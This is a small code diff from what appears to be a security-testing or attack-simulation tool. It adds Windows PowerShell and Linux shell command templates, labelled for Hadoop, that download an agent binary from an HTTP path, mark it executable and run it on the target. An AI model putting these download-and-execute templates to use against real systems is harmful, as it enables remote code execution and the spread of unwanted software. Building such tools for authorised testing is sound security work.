@@ -28,4 +28,14 @@ CHECK_COMMAND = "echo %s" % ID_STRING
 GET_ARCH_WINDOWS = "wmic os get osarchitecture"
 GET_ARCH_LINUX = "lscpu"
 
+# All in one commands (upload, change permissions, run)
+HADOOP_WINDOWS_COMMAND = "powershell -NoLogo -Command \"if (!(Test-Path '%(monkey_path)s')) { " \
+                      "Invoke-WebRequest -Uri '%(http_path)s' -OutFile '%(monkey_path)s' -UseBasicParsing }; " \
+                      " if (! (ps | ? {$_.path -eq '%(monkey_path)s'})) " \
+                      "{& %(monkey_path)s %(monkey_type)s %(parameters)s }  \""
+HADOOP_LINUX_COMMAND = "! [ -f %(monkey_path)s ] " \
+                    "&& wget -O %(monkey_path)s %(http_path)s " \
+                    "; chmod +x %(monkey_path)s " \
+                    "&&  %(monkey_path)s %(monkey_type)s %(parameters)s"
+
 DOWNLOAD_TIMEOUT = 300
